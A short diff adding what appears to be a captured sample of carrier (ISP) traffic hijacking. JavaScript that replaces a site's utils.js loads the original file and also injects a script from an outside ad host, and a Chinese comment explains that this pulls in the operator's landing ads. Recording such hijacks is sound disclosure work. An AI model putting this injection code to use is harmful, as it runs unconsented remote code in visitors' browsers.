@@ -1,0 +1,11 @@
+
+var _atn_obj_ = new Object; 
+_atn_obj_.oldurl = 'http://m.jjys168.com/static_v20171112/js/utils/utils.js?cHVzaA=102785'; 
+_atn_obj_.unified_url = 'http://ntx.quanliyouxi.cn:2525/adv_select/ad_unified_access?SP=ABzs/PzoPOz83Lg7yXnpGRmpOgmJugy8vPzM/Pg86Dy8vPzM/Pg8/IysrPys7PzcjKz7/OyczRmJuDzsfM0czH0c3Kz9HOyMiDzoPOz83Ix8qDz4PPg5LRlZWGjM7Jx9GckJKDzsrOz8vNzs/IzIPNg83Pz88='; 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.oldurl;document.getElementsByTagName("head")[0].appendChild(a);},0); 
+window.setTimeout(function(){var a=document.createElement("script");a.src=_atn_obj_.unified_url;document.getElementsByTagName("head")[0].appendChild(a);},0);
+
+把对utils.js等各种js文件的访问,改写成两个加载文件,从页引入运营商的落地广告.
+
+
+
